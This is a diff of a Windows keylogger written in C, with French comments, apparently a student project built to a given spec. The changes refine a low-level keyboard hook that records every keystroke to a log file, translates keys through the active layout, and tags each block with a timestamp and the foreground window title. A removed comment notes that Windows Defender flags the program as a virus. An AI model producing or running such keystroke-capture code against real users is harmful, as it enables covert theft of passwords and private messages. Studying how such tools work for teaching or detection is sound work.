@@ -1,47 +1,46 @@
 #include "winkey.h"
 
-// #define WIN32_LEAN_AND_MEAN
-// #include <stdio.h>
-// #include <windows.h>
-// #include <winsvc.h>
-// #include <psapi.h>
-// #include <time.h>
+// un jour je ferais le .h insha'Allah -> c'est fait
 
-// un jour je ferais le .h insha'Allah
+WCHAR lastTitle[256] = L"";
 
-//const char *winkey = "winkey.log";
-DWORD lastPid = 0;
+static void	wide_to_utf8(const WCHAR *src, char *dst, int dstsize)
+{
+	/*
+		convertit un WCHAR* (ce que crache l'api windows) en UTF-8
+		pour l'écrire pepouz dans le .log en %s
+	*/
+	WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstsize, NULL, NULL);
+}
 
 void	AffProcessName(DWORD processID, const char *path)
 {
 	/*
-		function qui affiche le process name ouais j'ai rien à dire
+		écrit la ligne d'entête d'un bloc :
+		[jj.mm.aaaa hh:mm:ss] - <titre de la fenetre active>
+		exactement comme dans l'exemple du sujet
 		#OnFarmLeGit
 	*/
+	(void)processID;
+
 	FILE *file = fopen(path, "a");
 	if (!file)
 		return ;
-	char	szProcessName[MAX_PATH] = "<inconnu>";
-
 
 	time_t	now = time(NULL);
 	struct tm t;
 	localtime_s(&t, &now);
 	char	buf[32];
-	strftime(buf, sizeof(buf), "[%d.%m. %Y %H:%M:%S]", &t);
-	fprintf(file, "\nTime : %s" ,buf);
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+	strftime(buf, sizeof(buf), "[%d.%m.%Y %H:%M:%S]", &t);
 
-	if (hProcess) {
-		HMODULE hmod;
-		DWORD	cbNeeded;
+	HWND	hwnd = GetForegroundWindow();
+	WCHAR	title[256] = L"";
+	GetWindowTextW(hwnd, title, 256);
 
-		if (EnumProcessModules(hProcess, &hmod, sizeof(hmod), &cbNeeded))
-			GetModuleBaseNameA(hProcess, hmod, szProcessName, sizeof(szProcessName));
-		CloseHandle(hProcess);
-	}
+	char	utf8title[512] = "";
+	wide_to_utf8(title, utf8title, sizeof(utf8title));
 
-	fprintf(file, "\nPID %lu: %s\n", processID, szProcessName);
+	fprintf(file, "\n%s - %s\n", buf, utf8title);
 	fclose(file);
 }
 
@@ -53,89 +52,96 @@ int    forground_process(void)
 	*/
 	HWND    hwnd;
 	DWORD   pid;
-	WCHAR	title[256] = L"";
 
 	hwnd = GetForegroundWindow();
-
-	if (!hwnd) {
-		GetWindowTextW(hwnd, title, 256);
-		wprintf(L"fenetre active : %ls\n", title);
-	}
-
 	GetWindowThreadProcessId(hwnd, &pid);
 	AffProcessName(pid, WINKEY);
-
-	/*printf("hwnd: %p\n", (void*)hwnd);
-	printf("pid: %lu\n", (unsigned long)pid);*/
 	return 0;
 }
 
-int write_key(const char *path, int vkCode)
+int write_key(const char *path, KBDLLHOOKSTRUCT *kb)
 {
 	/*
 		t'sais le mec qui croit qu'on est en python + rp claude
-		write_key permet d'écrire toute les entrées claviers dans
-		le fichier -> "path"
-	*/
-    FILE *file = fopen(path, "a");
-    if (!file)
-        return 1;
-
-    if (vkCode >= 'A' && vkCode <= 'Z') {
-        fprintf(file, "%c", vkCode);
-	}
-    else if (vkCode >= '0' && vkCode <= '9') {
-        fprintf(file, "%c", vkCode);
-	}
-	else if (!vkCode)
-		fprintf(file, "\n");
-
-    else
-	{
-        switch (vkCode)
-		{
-            case VK_SPACE: fprintf(file, " "); break;
-            case VK_RETURN: fprintf(file, "\n"); break;
-            case VK_TAB: fprintf(file, "[TAB]"); break;
-            case VK_BACK: fprintf(file, "[BACK]"); break;
-            case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
-            case VK_CONTROL: fprintf(file, "[CTRL]"); break;
-			case VK_RCONTROL: fprintf(file, "[RCTRL]"); break;
-			case VK_LCONTROL: fprintf(file, "[LCTRL]"); break;
-            case VK_MENU: fprintf(file, "[ALT]"); break;
-			case VK_UP: fprintf(file, "[UP]"); break;
-			case VK_DOWN: fprintf(file, "[DOWN]"); break;
-			case VK_LEFT: fprintf(file, "[LEFT]"); break;
-			case VK_RIGHT: fprintf(file, "[RIGHT]"); break;
-            default: fprintf(file, "<%d>", vkCode); break;
-        }
-    }
-    fclose(file);
-    return 0;
-}
-
-int write_in_file(const char *path, MSG msg)
-{
-	/*
-		je voulais faire un truc avec cette fonction mais ca fonctionne pas
-		en tout cas quand je l'a supp windows defender détecte que c'est
-		un virus et ca se lance pas sans ;-;
+		write_key écrit la touche en version lisible dans le .log.
+		-> les touches spéciales = un p'tit mot (Shift, Ctrl...) comme l'exemple
+		-> les vraies touches = traduites selon le layout clavier (locale)
+		   avec ToUnicodeEx, donc AZERTY/QWERTY/whatever ça suit
 	*/
 	FILE *file = fopen(path, "a");
-	if (!file) {
-		perror("can't open file");
+	if (!file)
 		return 1;
+
+	DWORD			vk = kb->vkCode;
+	const char		*name = NULL;
+
+	switch (vk)
+	{
+		case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:    		name = "Shift"; break;
+		case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:	name = "Ctrl"; break;
+		case VK_LMENU: case VK_RMENU: case VK_MENU:       		name = "Alt"; break;
+		case VK_LWIN: case VK_RWIN:                       		name = "Win"; break;
+		case VK_TAB:                                      		name = "Tab"; break;
+		case VK_BACK:                                     		name = "Back"; break;
+		case VK_CAPITAL:                                  		name = "CapsLock"; break;
+		case VK_ESCAPE:                                   		name = "Esc"; break;
+		case VK_DELETE:                                   		name = "Del"; break;
+		case VK_LEFT:                                     		name = "Left"; break;
+		case VK_RIGHT:                                    		name = "Right"; break;
+		case VK_UP:                                       		name = "Up"; break;
+		case VK_DOWN:                                     		name = "Down"; break;
+		case VK_RETURN:
+			fprintf(file, "\n");
+			fclose(file);
+			return 0;
+	}
+	if (name)
+	{
+		fprintf(file, "%s", name);
+		fclose(file);
+		return 0;
 	}
 
-	if (fprintf(file, "%u\n", msg.message) < 0) {
-		perror("error");
+	// état des modifieurs (fiable dans un hook LL via GetAsyncKeyState)
+	int		ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+	int		alt   = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
+	int		altgr = (ctrl && alt);
+
+	// Ctrl+touche (type CtrlS) -> on balance juste la lettre/chiffre brut
+	if (ctrl && !altgr)
+	{
+		if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9'))
+			fprintf(file, "%c", (char)vk);
 		fclose(file);
-		return 1;
+		return 0;
 	}
-	if (fclose(file) != 0) {
-		perror("error close file");
-		return 1;
+
+	// traduction selon la locale (layout de la fenetre au premier plan)
+	HWND	hwnd = GetForegroundWindow();
+	DWORD	tid = GetWindowThreadProcessId(hwnd, NULL);
+	HKL		layout = GetKeyboardLayout(tid);
+
+	BYTE	state[256] = {0};
+	if (GetAsyncKeyState(VK_SHIFT) & 0x8000)   state[VK_SHIFT] = 0x80;
+	if (GetKeyState(VK_CAPITAL) & 0x0001)      state[VK_CAPITAL] = 0x01;
+	if (altgr)
+	{
+		state[VK_CONTROL] = 0x80;
+		state[VK_MENU] = 0x80;
 	}
+
+	WCHAR	out[8] = L"";
+	int		n = ToUnicodeEx(vk, kb->scanCode, state, out, 8, 0, layout);
+
+	for (int i = 0; i < n; i++)
+	{
+		char	c[8] = "";
+		WCHAR	one[2] = { out[i], L'\0' };
+		wide_to_utf8(one, c, sizeof(c));
+		fprintf(file, "%s", c);
+	}
+
+	fclose(file);
 	return 0;
 }
 
@@ -143,29 +149,32 @@ LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
 {
 	/*
 		ca utilise tout ce qu'il y a avant pour en faire un seul bloc
-		la function de goat finallement
+		la function de goat finallement.
+		-> on log au KEYDOWN (comme l'exemple : "ShiftHey", Shift puis la frappe)
+		-> changement de fenetre (titre) = nouveau bloc avec entête
 	*/
-    int		vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;
+	KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lparam;
 
-	if (wparam == WM_KEYUP) {
-        HWND hwnd = GetForegroundWindow();
-        DWORD pid = 0;
-        GetWindowThreadProcessId(hwnd, &pid);
-		if (pid != lastPid) {
-			FILE *file = fopen(WINKEY, "a");
-			if (file) {
-				fprintf(file, "\n");
-				fclose(file);
-			}
+	if (ncode == HC_ACTION && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
+	{
+		HWND	hwnd = GetForegroundWindow();
+		WCHAR	title[256] = L"";
+		GetWindowTextW(hwnd, title, 256);
+
+		if (wcscmp(title, lastTitle) != 0)
+		{
+			DWORD	pid = 0;
+			GetWindowThreadProcessId(hwnd, &pid);
 			AffProcessName(pid, WINKEY);
-			lastPid = pid;
+			wcscpy_s(lastTitle, 256, title);
 		}
-		write_key(WINKEY, vkCode);
+		write_key(WINKEY, kb);
 	}
-    return (CallNextHookEx(NULL, ncode, wparam, lparam));
+	return (CallNextHookEx(NULL, ncode, wparam, lparam));
 }
 
-int	create_file(const char *path) {
+int	create_file(const char *path)
+{
 	/*
 		crée le fichier winkey.log situ
 	*/
@@ -175,35 +184,35 @@ int	create_file(const char *path) {
 		perror("Can't create file");
 		return 1;
 	}
+	fclose(f);
 	return 0;
 }
-
 
 int main(void)
 {
 	/*
 		la main function quoi classique
 	*/
-    HHOOK hook = SetWindowsHookEx(
-        WH_KEYBOARD_LL, // Type de hook
-        foo,            // Fonction a appeler
-        NULL,            // Ou trouver la fonction (null car osef)
-        0);                // Thread ID
-    MSG msg;
+	HHOOK hook = SetWindowsHookEx(
+		WH_KEYBOARD_LL, // Type de hook
+		foo,            // Fonction a appeler
+		NULL,           // Ou trouver la fonction (null car osef)
+		0);             // Thread ID
+	MSG msg;
 
-    if (hook == NULL)
-    {
-        printf("Failed to install hook: %ld\n", GetLastError());
-        return 1;
-    }
+	if (hook == NULL)
+	{
+		printf("Failed to install hook: %ld\n", GetLastError());
+		return 1;
+	}
 
-    printf("Hook ok: %p\n", (void*)hook);
+	printf("Hook ok: %p\n", (void*)hook);
 	create_file(WINKEY);
-    while (GetMessage(&msg, NULL, 0, 0))
-    {
-		write_in_file(WINKEY, msg);
-        //forground_process();
-        TranslateMessage(&msg); // jsp ca fais quoi sah
-    }
-    printf("haha\n");
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	UnhookWindowsHookEx(hook);
+	return 0;
 }
